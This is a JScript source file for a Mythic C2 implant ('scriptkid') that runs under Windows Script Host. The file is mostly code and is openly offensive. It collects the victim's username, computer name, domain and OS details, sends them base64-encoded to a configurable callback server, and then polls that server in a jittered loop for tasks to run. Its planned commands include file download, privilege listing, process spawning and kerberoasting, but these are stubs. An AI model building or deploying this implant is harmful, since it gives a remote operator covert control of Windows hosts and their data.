// scriptkid.js - Mythic scriptkid agent, JScript dialect.
// Status: minimal callback loop (checkin + tasking). Per-command handlers are TODO.
// Scope: see docs/minimal-agent-feature-set.md "JScript / VBScript scope".
// Build pipeline substitutes the __UPPER__ tokens at render time.
// mythic_encrypts = False in builder.py, so messages are base64 only.

var AGENT = {
    uuid: "__UUID__",
    callback_host: "__CALLBACK_HOST__",
    callback_port: "__CALLBACK_PORT__",
    get_uri: "__GET_URI__",
    post_uri: "__POST_URI__",
    query_path_name: "__QUERY_PATH_NAME__",
    callback_interval: parseInt("__CALLBACK_INTERVAL__", 10) || 10,
    callback_jitter: parseInt("__CALLBACK_JITTER__", 10) || 0,
    profile_headers: __PROFILE_HEADERS__,
    jobs: {}
};

// JScript (WSH) has no JSON global. Minimal inline polyfill.
if (typeof JSON === "undefined") { JSON = {}; }
if (typeof JSON.stringify !== "function") {
    JSON.stringify = (function () {
        function esc(s) {
            return s.replace(/[\\"\x00-\x1f]/g, function (c) {
                if (c === "\\") return "\\\\";
                if (c === "\"") return "\\\"";
                if (c === "\n") return "\\n";
                if (c === "\r") return "\\r";
                if (c === "\t") return "\\t";
                if (c === "\b") return "\\b";
                if (c === "\f") return "\\f";
                var h = c.charCodeAt(0).toString(16);
                while (h.length < 4) h = "0" + h;
                return "\\u" + h;
            });
        }
        function enc(v) {
            if (v === null || v === undefined) return "null";
            var t = typeof v;
            if (t === "string") return "\"" + esc(v) + "\"";
            if (t === "number") return isFinite(v) ? String(v) : "null";
            if (t === "boolean") return v ? "true" : "false";
            if (v && typeof v.length === "number" && typeof v.push === "function") {
                var out = [];
                for (var i = 0; i < v.length; i++) out.push(enc(v[i]));
                return "[" + out.join(",") + "]";
            }
            if (t === "object") {
                var parts = [];
                for (var k in v) {
                    if (!v.hasOwnProperty || v.hasOwnProperty(k)) {
                        var vv = v[k];
                        if (typeof vv !== "function" && typeof vv !== "undefined") {
                            parts.push("\"" + esc(k) + "\":" + enc(vv));
                        }
                    }
                }
                return "{" + parts.join(",") + "}";
            }
            return "null";
        }
        return enc;
    })();
}
if (typeof JSON.parse !== "function") {
    JSON.parse = function (s) { return eval("(" + s + ")"); };
}

function sleepMs(ms) { WScript.Sleep(ms); }
function nextSleep() {
    var base = AGENT.callback_interval * 1000;
    var j = AGENT.callback_jitter;
    if (j <= 0) return base;
    var pct = (Math.random() * 2 * j - j) / 100.0;
    var v = Math.round(base * (1 + pct));
    return v < 1000 ? 1000 : v;
}

function b64encode(str) {
    var utf8 = unescape(encodeURIComponent(str));
    var bin = new ActiveXObject("ADODB.Stream");
    bin.Type = 2; bin.Charset = "iso-8859-1"; bin.Open();
    bin.WriteText(utf8); bin.Position = 0; bin.Type = 1;
    var bytes = bin.Read(); bin.Close();
    var xml = new ActiveXObject("MSXML2.DOMDocument");
    var node = xml.createElement("b64");
    node.dataType = "bin.base64"; node.nodeTypedValue = bytes;
    return node.text.replace(/\r?\n/g, "");
}
function b64decode(s) {
    var xml = new ActiveXObject("MSXML2.DOMDocument");
    var node = xml.createElement("b64");
    node.dataType = "bin.base64"; node.text = s;
    var bytes = node.nodeTypedValue;
    var stream = new ActiveXObject("ADODB.Stream");
    stream.Type = 1; stream.Open(); stream.Write(bytes); stream.Position = 0;
    stream.Type = 2; stream.Charset = "iso-8859-1";
    var raw = stream.ReadText(); stream.Close();
    try { return decodeURIComponent(escape(raw)); } catch (e) { return raw; }
}

function buildUrl() {
    var host = AGENT.callback_host;
    var port = AGENT.callback_port;
    var uri = AGENT.post_uri || "";
    if (uri.length && uri.charAt(0) !== "/") uri = "/" + uri;
    var needsPort = true;
    if (host.indexOf("http://") === 0 && String(port) === "80") needsPort = false;
    if (host.indexOf("https://") === 0 && String(port) === "443") needsPort = false;
    return host + (needsPort ? ":" + port : "") + uri;
}

function postMessage(obj) {
    var json = JSON.stringify(obj);
    var payload = b64encode(AGENT.uuid + json);
    var xhr = new ActiveXObject("MSXML2.XMLHTTP");
    xhr.open("POST", buildUrl(), false);
    for (var k in AGENT.profile_headers) {
        try { xhr.setRequestHeader(k, AGENT.profile_headers[k]); } catch (e) {}
    }
    xhr.send(payload);
    if (xhr.status !== 200) { return null; }
    var body = xhr.responseText;
    var decoded = b64decode(body);
    if (decoded.length <= 36) return null;
    try { return JSON.parse(decoded.substr(36)); } catch (e) { return null; }
}

function getSysInfo() {
    var sh = new ActiveXObject("WScript.Shell");
    var env = sh.Environment("Process");
    var net = new ActiveXObject("WScript.Network");
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    var pid = 0;
    try {
        var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2");
        var procs = wmi.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE Name='cscript.exe' OR Name='wscript.exe'");
        var e = new Enumerator(procs);
        for (; !e.atEnd(); e.moveNext()) { pid = e.item().ProcessId; break; }
    } catch (ex) {}
    return {
        action: "checkin",
        uuid: AGENT.uuid,
        ip: "0.0.0.0",
        os: String(env("OS") || "Windows"),
        user: String(net.UserName),
        host: String(net.ComputerName),
        domain: String(net.UserDomain),
        pid: pid,
        architecture: String(env("PROCESSOR_ARCHITECTURE") || "x64"),
        integrity_level: 2,
        process_name: "cscript.exe"
    };
}

// Per-command handler stubs. Each takes a parsed task object and must return
// a result object { user_output: string, completed: bool } or throw.
var HANDLERS = {
    "help": function (task) { throw new Error("TODO: help"); },
    "exit": function (task) {
        try { WScript.Quit(0); } catch (e) {}
        return { user_output: "exiting", completed: true };
    },
    "pwd":  function (task) { throw new Error("TODO: pwd"); },
    "ls":   function (task) { throw new Error("TODO: ls"); },
    "mkdir":function (task) { throw new Error("TODO: mkdir"); },
    "mv":   function (task) { throw new Error("TODO: mv"); },
    "cat":  function (task) { throw new Error("TODO: cat"); },
    "upload":   function (task) { throw new Error("TODO: upload"); },
    "download": function (task) { throw new Error("TODO: download"); },
    "ps":   function (task) { throw new Error("TODO: ps"); },
    "kill": function (task) { throw new Error("TODO: kill"); },
    "jobs": function (task) { throw new Error("TODO: jobs"); },
    "jobkill": function (task) { throw new Error("TODO: jobkill"); },
    "env":  function (task) { throw new Error("TODO: env"); },
    "getprivs": function (task) { throw new Error("TODO: getprivs"); },
    "process_spawn": function (task) { throw new Error("TODO: process_spawn"); },
    "kerberoast":    function (task) { throw new Error("TODO: kerberoast"); }
};

function dispatch(task) {
    var h = HANDLERS[task.command];
    if (!h) return { task_id: task.id, user_output: "unknown: " + task.command, completed: true, status: "error" };
    try {
        var r = h(task);
        return { task_id: task.id, user_output: (r && r.user_output) || "", completed: true };
    } catch (e) {
        return { task_id: task.id, user_output: String(e.message || e), completed: true, status: "error" };
    }
}

function main() {
    // Checkin: swap payload UUID for a callback UUID.
    var resp = postMessage(getSysInfo());
    if (!resp || !resp.id) {
        WScript.Quit(1);
    }
    AGENT.uuid = resp.id;

    while (true) {
        var msg = { action: "get_tasking", tasking_size: 1 };
        var r = postMessage(msg);
        if (r && r.tasks && r.tasks.length) {
            var responses = [];
            for (var i = 0; i < r.tasks.length; i++) {
                responses.push(dispatch(r.tasks[i]));
            }
            postMessage({ action: "post_response", responses: responses });
        }
        sleepMs(nextSleep());
    }
}

main();
